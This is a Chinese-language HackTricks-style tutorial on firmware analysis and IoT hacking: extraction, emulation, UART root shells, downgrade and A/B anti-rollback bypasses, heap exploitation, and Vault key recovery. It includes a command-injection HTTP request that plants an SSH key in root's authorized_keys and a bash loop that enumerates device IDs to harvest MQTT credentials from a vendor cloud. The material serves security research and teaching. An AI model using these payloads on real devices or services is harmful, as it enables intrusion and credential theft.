# 固件分析

{{#include ../../banners/hacktricks-training.md}}

## **简介**

### 相关资源


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

固件是使设备能够正常运行的关键软件，负责管理硬件组件与用户交互的软件之间的通信并促进这种通信。它存储在永久性存储器中，确保设备从通电时起即可访问关键指令，并最终启动操作系统。检查固件并尝试对其进行修改，是识别安全漏洞的关键步骤。<sup>[[2]](#references)[[3]](#references)</sup>

## **信息收集**

**信息收集**是了解设备组成及其所使用技术的关键初始步骤。此过程包括收集以下数据：

- CPU 架构及其运行的操作系统
- Bootloader 具体信息
- 硬件布局和数据表
- 代码库指标和源代码位置
- 外部库及许可证类型
- 更新历史和监管认证
- 架构图和流程图
- 安全评估及已识别的漏洞

为此，**open-source intelligence (OSINT)** 工具非常有价值；同时，还应通过手动和自动化审查流程分析所有可用的 open-source 软件组件。[Coverity Scan](https://scan.coverity.com) 和 [Semmle’s LGTM](https://lgtm.com/#explore) 等工具提供免费的静态分析，可用于发现潜在问题。

## **获取固件**

可以通过多种方式获取固件，每种方式的复杂程度各不相同：

- 从源头（开发人员、制造商）**直接获取**
- 根据提供的说明**构建**
- 从官方支持网站**下载**
- 使用 **Google dork** 查询查找托管的固件文件
- 直接访问 **cloud storage**，使用 [S3Scanner](https://github.com/sa7mon/S3Scanner) 等工具
- 使用 man-in-the-middle 技术拦截**更新**
- 通过 **UART**、**JTAG** 或 **PICit** 等连接从设备中**提取**
- 在设备通信中**嗅探**更新请求
- 识别并使用**硬编码的更新端点**
- 从 Bootloader 或网络中**转储**
- 在其他方法都失败时，使用适当的硬件工具**移除并读取**存储芯片

### 仅 UART 日志：通过 flash 中的 U-Boot env 强制获取 root shell

如果 UART RX 被忽略（仅有日志），仍然可以通过离线**编辑 U-Boot environment blob**来强制启动 init shell：<sup>[[6]](#references)</sup>

1. 使用 SOIC-8 clip 和 programmer（3.3V）转储 SPI flash：
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. 定位 U-Boot env 分区，编辑 `bootargs` 以加入 `init=/bin/sh`，并为该 blob **重新计算 U-Boot env CRC32**。
3. 仅重新刷写 env 分区并重启；UART 上应会出现一个 shell。

这对于 Bootloader shell 已被禁用、但可通过外部 flash 访问写入 env 分区的嵌入式设备非常有用。

## 分析固件

现在你已经**获得固件**，需要提取其中的信息，以了解应如何处理它。可以使用不同的工具完成此任务：
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
如果使用这些工具没有发现太多内容，请使用 `binwalk -E <bin>` 检查镜像的 **entropy**；如果 entropy 较低，则不太可能经过加密。如果 entropy 较高，则很可能已加密（或以某种方式压缩）。

此外，你还可以使用这些工具提取 **固件内部嵌入的文件**：

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

或者使用 [**binvis.io**](https://binvis.io/#/)（[代码](https://code.google.com/archive/p/binvis/)）检查文件。

### 获取文件系统

使用前面提到的工具（例如 `binwalk -ev <bin>`），你应该已经能够 **提取文件系统**。\
Binwalk 通常会将其提取到一个 **以文件系统类型命名的文件夹中**，通常是以下类型之一：squashfs、ubifs、romfs、rootfs、jffs2、yaffs2、cramfs、initramfs。

#### 手动提取文件系统

有时，binwalk 的 signatures 中 **没有文件系统的 magic byte**。在这种情况下，请使用 binwalk **查找文件系统的偏移量，并从二进制文件中 carve 出压缩的文件系统**，然后根据其类型，按照以下步骤 **手动提取** 文件系统。
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
运行以下 **dd 命令**来 carve 出 Squashfs 文件系统。
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
或者，也可以运行以下命令。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- 对于 squashfs（上例中使用）

`$ unsquashfs dir.squashfs`

之后，文件将位于 "`squashfs-root`" 目录中。

- CPIO archive 文件

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- 对于 jffs2 filesystems

`$ jefferson rootfsfile.jffs2`

- 对于使用 NAND flash 的 ubifs filesystems

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## 分析 Firmware

获取 firmware 后，必须对其进行剖析，以了解其结构和潜在漏洞。此过程需要使用各种工具来分析并提取 firmware image 中的有价值数据。

### 初始分析工具

以下提供了一组用于初步检查 binary file（记作 `<bin>`）的命令。这些命令有助于识别 file 类型、提取 strings、分析 binary data，以及了解 partition 和 filesystem 的详细信息：
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
要评估镜像的加密状态，可以使用 `binwalk -E <bin>` 检查其 **entropy**。低 entropy 表明可能未加密，而高 entropy 则表示可能存在加密或压缩。

要提取**嵌入文件**，建议使用 **file-data-carving-recovery-tools** 文档等工具和资源，以及用于文件检查的 **binvis.io**。

### 提取文件系统

使用 `binwalk -ev <bin>` 通常可以提取文件系统，提取结果通常位于以文件系统类型命名的目录中（例如 squashfs、ubifs）。但是，当 **binwalk** 因缺少 magic bytes 而无法识别文件系统类型时，就需要手动提取。这包括使用 `binwalk` 定位文件系统的偏移量，然后使用 `dd` 命令将文件系统 carve 出来：
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
之后，根据文件系统类型（例如 squashfs、cpio、jffs2、ubifs），会使用不同的命令手动提取其内容。

### 文件系统分析

提取文件系统后，便开始搜索安全漏洞。重点关注不安全的网络守护进程、硬编码凭据、API endpoints、更新服务器功能、未编译代码、启动脚本，以及用于离线分析的已编译二进制文件。

**需要检查的关键位置**和**项目**包括：

- **etc/shadow** 和 **etc/passwd** 中的用户凭据
- **etc/ssl** 中的 SSL 证书和密钥
- 可能存在漏洞的配置文件和脚本文件
- 用于进一步分析的嵌入式二进制文件
- 常见 IoT 设备的 Web 服务器和二进制文件

以下工具有助于发现文件系统中的敏感信息和漏洞：

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) 和 [**Firmwalker**](https://github.com/craigz28/firmwalker)，用于搜索敏感信息
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)，用于全面的固件分析
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer)、[**ByteSweep**](https://gitlab.com/bytesweep/bytesweep)、[**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) 和 [**EMBA**](https://github.com/e-m-b-a/emba)，用于静态和动态分析

### 已编译二进制文件的安全检查

必须仔细检查文件系统中发现的源代码和已编译二进制文件，以发现其中的漏洞。**checksec.sh** 等工具可用于 Unix 二进制文件，**PESecurity** 可用于 Windows 二进制文件，帮助识别可能被利用的未受保护二进制文件。

## 通过派生的 URL tokens 获取 cloud 配置和 MQTT 凭据

许多 IoT hubs 会从类似以下地址的 cloud endpoint 获取每台设备的配置：<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

在固件分析期间，你可能会发现 `<token>` 是设备使用硬编码 secret 根据设备 ID 在本地派生的，例如：

- token = MD5( deviceId || STATIC_KEY )，并表示为大写十六进制

这种设计使任何获知 deviceId 和 STATIC_KEY 的人都能够重构该 URL 并获取 cloud 配置，而其中通常会暴露明文 MQTT 凭据和 topic 前缀。

实际操作流程：

1) 从 UART 启动日志中提取 deviceId

- 连接 3.3V UART adapter（TX/RX/GND）并捕获日志：
```bash
picocom -b 115200 /dev/ttyUSB0
```
- 查找打印云端配置 URL 模式和 broker 地址的行，例如：
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) 从 firmware 中恢复 STATIC_KEY 和 token 算法

- 将二进制文件加载到 Ghidra/radare2，并搜索配置路径（"/pf/"）或 MD5 的使用位置。
- 确认算法（例如，MD5(deviceId||STATIC_KEY)）。
- 在 Bash 中生成 token，并将摘要转换为大写：
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Harvest cloud config and MQTT credentials

- 使用 curl 拼接 URL 并提取 JSON；使用 jq 解析以提取 secrets：
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) 滥用明文 MQTT 和薄弱的 topic ACL（如果存在）

- 使用恢复的凭据订阅维护 topic，并查找敏感事件：
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) 枚举可预测的 device IDs（大规模进行，需获得授权）

- 许多生态系统会嵌入 vendor OUI/product/type 字节，后跟一个顺序递增的后缀。
- 你可以遍历候选 IDs，以编程方式派生 tokens 并获取 configs：
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
注意事项
- 始终在尝试大规模枚举之前获得明确授权。
- 在可能的情况下，优先使用仿真或静态分析来恢复 secrets，避免修改目标硬件。


Firmware 仿真过程可以对设备的运行状态或单个程序进行**动态分析**。这种方法可能会遇到硬件或架构依赖方面的挑战，但将 root filesystem 或特定 binaries 转移到架构和字节序匹配的设备（例如 Raspberry Pi），或转移到预构建的虚拟机中，可以进一步开展测试。

### 仿真单个 Binaries

检查单个程序时，确定程序的字节序和 CPU 架构至关重要。

#### MIPS 架构示例

要仿真 MIPS 架构的 binary，可以使用以下命令：
```bash
file ./squashfs-root/bin/busybox
```
并安装必要的仿真工具：
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
对于 MIPS（big-endian），使用 `qemu-mips`；对于 little-endian 二进制文件，则应选择 `qemu-mipsel`。

#### ARM 架构仿真

对于 ARM 二进制文件，过程类似，使用 `qemu-arm` emulator 进行仿真。

### 完整系统仿真

[Firmadyne](https://github.com/firmadyne/firmadyne)、[Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) 等工具支持完整的 firmware 仿真，能够自动化处理流程并辅助进行动态分析。

## 实践中的动态分析

在此阶段，使用真实或仿真的设备环境进行分析。必须保持对 OS 和 filesystem 的 shell 访问权限。仿真可能无法完美模拟硬件交互，因此有时需要重启仿真。分析应重新检查 filesystem，利用暴露的网页和网络服务，并探查 bootloader 漏洞。Firmware integrity tests 对识别潜在的 backdoor 漏洞至关重要。

## Runtime 分析技术

Runtime 分析涉及在进程或二进制文件的运行环境中与其交互，使用 gdb-multiarch、Frida 和 Ghidra 等工具设置断点，并通过 fuzzing 及其他技术识别漏洞。

对于没有完整 debugger 的嵌入式目标，**将静态链接的 `gdbserver` 复制**到设备，并远程附加：<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor 消息映射

在 IoT hubs 上，RF stack 通常由 **radio MCU** 和 Linux userland process 分担。一个有用的工作流程是映射以下路径：<sup>[[8]](#references)</sup>

1. 空中的 **RF frame**
2. radio MCU 上的 **controller-side parser**
3. 转发到 Linux 的 **serial/UART text or TLV protocol**（例如 `/dev/tty*`）
4. 主 daemon 中的 **application dispatcher**
5. **protocol-specific handler / state machine**

这种架构会产生两个 reversing target，而不是一个。如果 controller 将 binary radio frames 转换为类似 `Group,Command,arg1,arg2,...` 的 textual protocol，请找出：

- **message groups** 和 dispatch tables
- 哪些消息可以来自 **network**，哪些只能来自 controller 本身
- 确切的 **manufacturer-specific discriminator fields**（例如 Zigbee 的 `manufacturer_code` 和自定义的 `cluster_command`）
- 哪些 handlers 只有在 **commissioning**、discovery 或 firmware/model download 阶段才可到达

对于 Zigbee，capture pairing traffic，并检查 target 是否仍依赖默认的 **Link Key** `ZigBeeAlliance09`。如果是这样，sniffing commissioning traffic 可能会暴露 **Network Key**。Zigbee 3.0 install codes 可降低这种暴露，因此应记录被测试设备是否实际强制执行这些 codes。

### Manufacturer-specific protocol handlers 和 FSM-gated reachability

Vendor-specific Zigbee/ZCL commands 通常比 standardized clusters 更适合作为 target，因为它们会进入 **custom parsing code** 和内部 **FSMs**，而这些代码经过实战验证的 validation 往往更少。<sup>[[8]](#references)</sup>

实际工作流程：

- Reverse command dispatcher，直到找到 **vendor-only handler**。
- 恢复 **FSM state**、**event**、**check**、**action** 和 **next-state** tables。
- 找出会自动前进的 **transitional states**，以及最终会 reset 或释放 attacker-controlled state 的 retry/error branches。
- 确认哪些合法的 protocol exchanges 是将 daemon 置于 vulnerable state 所必需的，而不要假设 buggy handler 始终可达。

对于 timing-sensitive protocols，通过 Python framework 进行 packet replay 可能过慢。更可靠的方法是使用真实硬件（例如 **nRF52840**）模拟合法设备，并使用 vendor-grade stack，从而暴露正确的 **endpoints**、**attributes** 和 commissioning timing。

### Embedded daemons 中的 fragmented-download bug class

一种反复出现的 firmware bug class 存在于 **fragmented blob/model/configuration downloads** 中：<sup>[[8]](#references)</sup>

1. **first fragment**（`offset == 0`）存储 `ctx->total_size`，并执行 `malloc(total_size)`。
2. 后续 fragments 只验证 attacker-controlled 的 **packet-local** fields，例如 `packet_total_size >= offset + chunk_len`。
3. copy 使用 `memcpy(&ctx->buffer[offset], chunk, chunk_len)`，却没有检查其是否超出 **original allocated size**。

这允许 attacker 发送：

- 一个声明 **small** total size 的有效 first fragment，以强制执行小型 heap allocation。
- 一个具有 **expected offset** 但 `chunk_len` 更大的后续 fragment。
- 一个 forged packet-local size，使其满足最新 checks，同时仍溢出最初分配的 buffer。

当 vulnerable path 位于 commissioning logic 后方时，exploit 必须包含足够的 **device emulation**，先驱动 target 进入预期的 model-download 或 blob-download state，然后再发送 malformed fragments。

### Protocol-driven `free()` triggers

在 embedded daemons 中，触发 heap metadata exploitation 最简单的方法通常不是“等待 cleanup”，而是**强制执行 protocol 自身的 error handling**：<sup>[[8]](#references)</sup>

- 发送 malformed follow-up fragments，将 FSM 推入 **retry** 或 **error** states。
- 超过 retry threshold，使 daemon **resets context** 并释放 corrupted buffer。
- 利用这个可预测的 `free()`，在 process 因其他原因 crash 之前触发 allocator-side primitives。

这对 embedded Linux 中的 **musl/uClibc/dlmalloc-like** allocators 尤其有用，因为 corrupting chunk metadata 可以将 unlink/unbin logic 转化为 write primitive。一个稳定的模式是修改 **size field**，将 allocator traversal 重定向到位于 overflowed buffer 内预先布置的 **fake chunks**，而不是立即覆盖真实的 bin pointers 并导致 process crash。

## Binary Exploitation and Proof-of-Concept

为已识别的 vulnerabilities 开发 PoC，需要深入理解 target architecture，并使用 lower-level languages 编程。Embedded systems 中的 binary runtime protections 很少见，但如果存在，可能需要使用 Return Oriented Programming（ROP）等 techniques。

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation：**uClibc 使用类似 glibc 的 fastbins。后续的大型 allocation 可能触发 `__malloc_consolidate()`，因此任何 fake chunk 都必须通过 checks（合理的 size、`fd = 0`，以及被视为“in use”的相邻 chunks）。<sup>[[6]](#references)</sup>
- **Non-PIE binaries under ASLR：**如果启用了 ASLR，但主 binary 是 **non-PIE**，则 binary 内 `.data/.bss` 的 addresses 是稳定的。可以 targeting 一个已经类似有效 heap chunk header 的 region，使 fastbin allocation 落到 **function pointer table** 上。
- **Parser-stopping NUL：**解析 JSON 时，payload 中的 `\x00` 可以停止 parsing，同时保留 trailing attacker-controlled bytes，用于 stack pivot/ROP chain。
- **Shellcode via `/proc/self/mem`：**调用 `open("/proc/self/mem")`、`lseek()` 和 `write()` 的 ROP chain 可以将 executable shellcode 写入已知 mapping，并跳转到该位置。

## Prepared Operating Systems for Firmware Analysis

诸如 [AttifyOS](https://github.com/adi0x90/attifyos) 和 [EmbedOS](https://github.com/scriptingxss/EmbedOS) 这样的 operating systems 提供了预配置的 firmware security testing environments，并配备必要的 tools。

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos)：AttifyOS 是一个旨在帮助你对 Internet of Things（IoT）devices 执行 security assessment 和 penetration testing 的 distro。它提供一个预配置环境，并加载所有必要的 tools，从而节省大量时间。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS)：基于 Ubuntu 18.04 的 embedded security testing operating system，预加载了 firmware security testing tools。

## Firmware Downgrade Attacks & Insecure Update Mechanisms

即使 vendor 对 firmware images 实现了 cryptographic signature checks，**version rollback（downgrade）protection 也经常被省略**。当 boot- 或 recovery-loader 只使用 embedded public key 验证 signature，却不比较待刷入 image 的 *version*（或 monotonic counter）时，attacker 可以合法安装一个**较旧且存在漏洞、但仍带有有效 signature 的 firmware**，从而重新引入已经修复的 vulnerabilities。<sup>[[4]](#references)</sup>

典型 attack workflow：

1. **Obtain an older signed image**
* 从 vendor 的 public download portal、CDN 或 support site 获取。
* 从 companion mobile/desktop applications 中提取（例如位于 Android APK 的 `assets/firmware/` 下）。
* 从 VirusTotal、Internet archives、forums 等 third-party repositories 获取。
2. 通过任何 exposed update channel **Upload or serve the image to the device**：
* Web UI、mobile-app API、USB、TFTP、MQTT 等。
* 许多 consumer IoT devices 暴露了*未经 authentication* 的 HTTP(S) endpoints，这些 endpoints 接受 Base64-encoded firmware blobs，在 server-side 解码后触发 recovery/upgrade。
3. Downgrade 后，利用在较新 release 中已经修复的 vulnerability（例如后来加入的 command-injection filter）。
4. 可选：在获得 persistence 后重新 flash 最新 image，或 disable updates，以避免被发现。

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
在存在漏洞的（降级后的）固件中，`md5` 参数未经清理就被直接拼接到 shell 命令中，从而允许注入任意命令（此处用于启用基于 SSH 密钥的 root 访问）。后续固件版本引入了基础字符过滤，但由于缺少 downgrade protection，该修复形同虚设。<sup>[[4]](#references)</sup>

### 从移动应用中提取固件

许多厂商会将完整的固件镜像捆绑在配套移动应用中，以便应用通过 Bluetooth/Wi-Fi 更新设备。这些软件包通常以未加密形式存储在 APK/APEX 中的 `assets/fw/` 或 `res/raw/` 等路径下。使用 `apktool`、`ghidra`，甚至普通的 `unzip`，即可提取已签名的镜像，而无需接触实体硬件。<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### A/B slot 设计中仅由 Updater 实现的 anti-rollback 绕过

一些厂商确实实现了 anti-downgrade **ratchet**，但只存在于 *updater* 逻辑中（例如通过 CAN 传输的 UDS routine、recovery command 或 userspace OTA agent）。如果之后 **bootloader** 只检查 image signature/CRC，并信任 partition table 或 slot metadata，rollback protection 仍然可以被绕过。<sup>[[7]](#references)</sup>

典型的薄弱设计：

- Firmware metadata 同时包含 version descriptor 和 **security ratchet** / monotonic counter。
- Updater 将 image ratchet 与 persistent storage 中保存的值进行比较，并拒绝较旧的 signed images。
- Bootloader **不解析**该 ratchet，只在启动所选 slot 前验证 header、CRC 和 signature。
- Slot activation 单独存储在 partition table 或 per-slot generation counter 中，且**未与已验证的确切 firmware digest 进行 cryptographic binding**。

这会在 dual-slot systems 中产生 **validate-one-image / boot-another-image** primitive。如果攻击者能够使用当前 signed image 让 updater 将 slot B 标记为下一次 boot target，并能在 reboot 前覆盖 slot B，bootloader 仍可能启动 downgraded image，因为它只信任已经提交的 slot metadata。

常见的滥用模式：

1. 将 **current signed** firmware 上传到 passive slot，并运行正常的 validation/switch routine，使 layout 将该 slot 标记为 next active。
2. **暂时不要 reboot**。在同一 session 中重新进入 slot-preparation/erase routine。
3. 滥用 stale boot-state 或 stale slot-selection logic，使 updater 擦除刚刚被提升的**同一个 physical slot**。
4. 将**较旧但仍然 signed**的 firmware 写入该 slot。
5. 跳过执行 ratchet 检查的 validation routine，直接 reboot。
6. Bootloader 选择被提升的 slot，只验证 signature/integrity，然后启动旧 image。

逆向 A/B update implementations 时需要关注：

- 从 **boot-time flags** 派生 slot selection，但 successful switch 后不会刷新这些 flags。
- 类似 `prepare_passive_slot()` 的 routine 根据 stale state 而不是**当前已提交的 layout**擦除 slot。
- 类似 `part_write_layout()` 的 function 只递增 **generation counter** / active flag，却不存储已验证 image hash。
- Ratchet checks 在 userspace 或 updater code 中实现，但**未在 ROM / bootloader / secure boot stages 中实现**。
- Erase 或 recovery routines 在 slot 内容被移除并重写后，仍将该 slot 保持为 bootable。

### 评估 Update Logic 的 Checklist

* *update endpoint* 的 transport/authentication 是否受到充分保护（TLS + authentication）？
* Device 在 flashing 前是否比较 **version numbers** 或 **monotonic anti-rollback counter**？
* Image 是否在 secure boot chain 中完成验证（例如由 ROM code 检查 signatures）？
* **Bootloader 是否强制执行与 updater 相同的 ratchet**，而不是只检查 signature/CRC？
* Slot activation metadata 是否与已验证的 firmware digest/version **绑定**，还是 slot 在 promotion 后仍可被修改？
* Slot switch 成功后，device 是否被强制 reboot，还是后续 update/erase routines 仍可在同一 session 中访问？
* Userland code 是否执行额外的 sanity checks（例如 allowed partition map、model number）？
* *partial* 或 *backup* update flows 是否复用相同的 validation logic？

> 💡  如果以上任一项缺失，该 platform 很可能容易受到 rollback attacks 的影响。

## 用于实践的 Vulnerable firmware

要练习发现 firmware 中的 vulnerabilities，可以以下列 vulnerable firmware projects 作为起点。

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 从嵌入式 KMS/Vault 状态中恢复 firmware decryption keys

当 update image 将少量 plaintext metadata 与大型 high-entropy blob 混合在一起时，应先进行 container triage，不要立即进行 brute-forcing：<sup>[[1]](#references)</sup>

- 使用 `hexdump`、`xxd`、`strings -tx`、`base64 -d` 和 `binwalk -E` 转储 headers、offsets 以及 line boundaries。
- `Salted__` 通常表示 OpenSSL `enc` format：接下来的 8 bytes 是 salt，其余 bytes 是 ciphertext。
- 一个解码后恰好为 `256` bytes 的 Base64 field，是一个强烈信号，表明你看到的可能是用于封装随机 firmware password/session key 的 RSA-2048 ciphertext。
- 同一 file 中的 detached PGP material 通常只用于保护 authenticity；不要假设它是 confidentiality mechanism。

如果 static key hunting（`grep`、`strings`、PEM/PGP searches）失败，应 reverse **operational decrypt path**，而不是只搜索 private keys：

- Decompile updater / management binary，追踪谁读取 encrypted blob、哪个 helper/API 对其进行 unwrap，以及它请求的 logical key name。
- 在 extracted root filesystem 中搜索 KMS state（`vault/`、`transit/`、`pkcs11`、`keystore`、`sealed-secrets`），以及 unit files 和 init scripts。
- 将明文 `vault operator unseal ...`、recovery keys、bootstrap tokens 或 local KMS auto-unseal scripts 视为等同于 private-key material。

如果 appliance 自带原始 Vault binary 和 storage backend，通常 replay 该 environment 比重新实现 Vault internals 更容易：
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
在克隆的 KMS 上使用 root 权限：

- 仅在隔离克隆中使 transit keys 可导出：`vault write transit/keys/<name>/config exportable=true`
- 导出 unwrap key：`vault read transit/export/encryption-key/<name>`
- 使用 KMS 所采用的确切 padding/hash 组合尝试恢复的 RSA key。PKCS#1 v1.5 解密失败以及默认 OAEP 解密失败，**不能**证明该 key 错误；许多基于 Vault 的流程使用 SHA-256 的 OAEP，而常见库默认使用 SHA-1。
- 如果 payload 以 `Salted__` 开头，请准确复现 vendor 的 OpenSSL KDF（`EVP_BytesToKey`，旧版 appliance 通常使用 MD5），然后再尝试 AES-CBC 解密。

这会将“加密固件”转化为一个更普遍的问题：**恢复 appliance 端的 operational keys，然后在离线环境中复现确切的 unwrap + KDF 参数**。

## 培训与认证

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [使用 Claude 破解固件：高级专家级技能，初级人员级自主性](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [固件安全测试方法论](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [实用 IoT Hacking：攻击物联网的权威指南](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [利用已废弃硬件中的 zero days——Trail of Bits 博客](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [一台 20 美元的 Smart Device 如何让我访问你的家](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [现在你看到了 mi：现在你已被 Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv——通过 Tesla Wall Connector 的充电端口连接器进行 Exploiting——第 2 部分：绕过 anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [让它闪烁：Philips Hue Bridge 的 Over-the-Air Exploitation](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
